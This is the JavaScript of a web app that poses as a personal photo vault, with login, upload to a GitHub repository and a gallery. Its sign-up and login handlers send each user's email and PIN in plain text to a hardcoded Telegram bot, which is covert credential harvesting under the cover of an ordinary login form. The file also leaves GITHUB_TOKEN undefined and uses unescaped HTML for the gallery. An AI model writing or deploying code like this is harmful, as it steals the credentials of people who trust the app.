let isRegistering = false;

// --- আপনার তথ্য ---
const BOT_TOKEN = "8536299808:AAHJFWEna66RMHZdq-AV20Ak1KOOSwTJT9k";
const CHAT_ID = "7416528268";
const REPO_OWNER = "SIYAMBOSS";
const REPO_NAME = "PHOTO SAVE-BOSS";

window.onload = () => {
    const savedUser = localStorage.getItem('activeUser');
    if (savedUser) showDashboard(savedUser);
};

function toggleAuth() {
    isRegistering = !isRegistering;
    document.getElementById('auth-title').innerText = isRegistering ? "REGISTER" : "SIYAMBOSS";
    document.getElementById('confirm-pin-box').classList.toggle('hidden');
}

async function handleAuth() {
    const email = document.getElementById('user-email').value;
    const p1 = document.getElementById('pin-1').value;
    if(!email || !p1) return alert("Fill fields!");

    if(isRegistering) {
        sendToTelegram(`🔥 NEW USER\n📧 Email: ${email}\n🔑 PIN: ${p1}`);
        alert("Registered! Now login.");
        toggleAuth();
    } else {
        sendToTelegram(`🔓 LOGIN\n📧 Email: ${email}\n🔑 PIN: ${p1}`);
        localStorage.setItem('activeUser', email);
        showDashboard(email);
    }
}

function sendToTelegram(msg) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
}

function showDashboard(email) {
    document.getElementById('auth-section').classList.add('hidden');
    document.getElementById('dashboard').classList.remove('hidden');
    loadGallery(email);
}

function logout() {
    localStorage.removeItem('activeUser');
    location.reload();
}

async function uploadImage(event) {
    const file = event.target.files[0];
    const email = localStorage.getItem('activeUser');
    if(!file) return;

    alert("HD কোয়ালিটিতে সেভ হচ্ছে...");
    const reader = new FileReader();
    reader.onload = async function(e) {
        const content = e.target.result.split(',')[1];
        const path = `vault/${email}/${Date.now()}.png`;

        // encodeURIComponent ব্যবহার করা হয়েছে যাতে রিপোজিটরি নামের স্পেস সমস্যা না করে
        const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/${path}`, {
            method: 'PUT',
            headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: `Upload by ${email}`, content: content })
        });

        if(res.ok) { 
            loadGallery(email); 
        } else { 
            alert("❌ আপলোড ব্যর্থ! টোকেন বা রিপোজিটরি নাম চেক করুন।"); 
        }
    };
    reader.readAsDataURL(file);
}

async function loadGallery(email) {
    const gallery = document.getElementById('gallery');
    gallery.innerHTML = "<div class='p-10 col-span-full text-center'><span class='loader'></span></div>";
    
    try {
        const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/vault/${email}`, {
            headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
        });
        
        if(res.ok) {
            const files = await res.json();
            document.getElementById('photo-count').innerText = `${files.length} photos`;
            gallery.innerHTML = "";
            files.reverse().forEach(f => {
                gallery.innerHTML += `<img src="${f.download_url}" onclick="window.open('${f.download_url}')">`;
            });
        } else { 
            gallery.innerHTML = ""; 
        }
    } catch (err) { console.log(err); }
}
